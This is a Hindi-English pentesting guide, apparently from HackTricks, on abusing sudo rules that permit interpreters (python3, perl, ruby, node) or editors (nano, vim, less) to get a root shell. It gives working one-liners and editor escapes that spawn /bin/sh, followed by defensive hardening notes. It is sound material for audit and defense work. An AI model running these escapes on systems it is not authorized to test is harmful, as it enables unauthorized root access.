# Sudo Command Abuse

{{#include ../../banners/hacktricks-training.md}}

## Sudo-allowed interpreters

यदि `sudo -l` किसी user को root के रूप में कोई interpreter चलाने की अनुमति देता है, तो इसे direct code execution मानें। Interpreters arbitrary code execute करने के लिए बनाए गए हैं, इसलिए `python3`, `perl`, `ruby`, `lua`, `node` या इसी तरह के binaries को allow करने वाला rule आमतौर पर root command execution के बराबर होता है, जब तक कि arguments को सख्ती से constrain और validate न किया गया हो।

Common review flow:
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
अन्य interpreter के उदाहरण:
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
सटीक path महत्वपूर्ण है। यदि sudo rule `/usr/bin/python3` की अनुमति देता है, तो validation के दौरान उसी सटीक path का उपयोग करें:
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Sudo-allowed editors

यदि `sudo -l` किसी user को root के रूप में interactive editor चलाने की अनुमति देता है, तो इसे harmless file-editing permission के बजाय command-execution surface मानें। Editors अक्सर shell commands execute कर सकते हैं, arbitrary files पढ़ सकते हैं, arbitrary files लिख सकते हैं या editor के भीतर से external helpers invoke कर सकते हैं।

Common review flow:
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Nano command execution

जब `nano` को sudo के माध्यम से अनुमति दी जाती है, तो editor interface से command execution तक पहुँचा जा सकता है:
```text
Ctrl+R
Ctrl+X
```
फिर इस तरह का command दें:
```bash
id
/bin/sh
```
कुछ terminals पर, एक interactive shell को standard streams redirect करने की आवश्यकता हो सकती है:
```bash
reset; /bin/sh 1>&0 2>&0
```
सटीक key sequence nano के version और build options के अनुसार अलग हो सकता है, लेकिन security issue वही रहता है: editor root के रूप में चल रहा है और external commands invoke कर सकता है।

### अन्य सामान्य editor escapes

Vim-style editors आमतौर पर `:!` के माध्यम से command execution उपलब्ध कराते हैं:
```text
:!/bin/sh
```
`less` जैसे Pagers भी shell execution को expose कर सकते हैं:
```text
!/bin/sh
```
## रक्षात्मक नोट्स

- sudo के माध्यम से interpreters या interactive editors देने से बचें।
- ऐसे fixed, root-owned wrappers को प्राथमिकता दें जो केवल एक सीमित administrative action करते हों।
- यदि interpreter अपरिहार्य हो, तो exact script path को restrict करें और user-controlled arguments, writable imports, `PYTHONPATH`, तथा unsafe environment preservation को रोकें।
- यदि file editing आवश्यक हो, तो exact file path को restrict करें और patched sudo versions तथा strict environment handling के साथ `sudoedit` का उपयोग करने पर विचार करें।
- `SETENV`, `env_keep`, writable working directories, writable module/import paths, `NOEXEC`, `use_pty`, और logging की समीक्षा करें, लेकिन इन्हें complete sandbox न मानें।
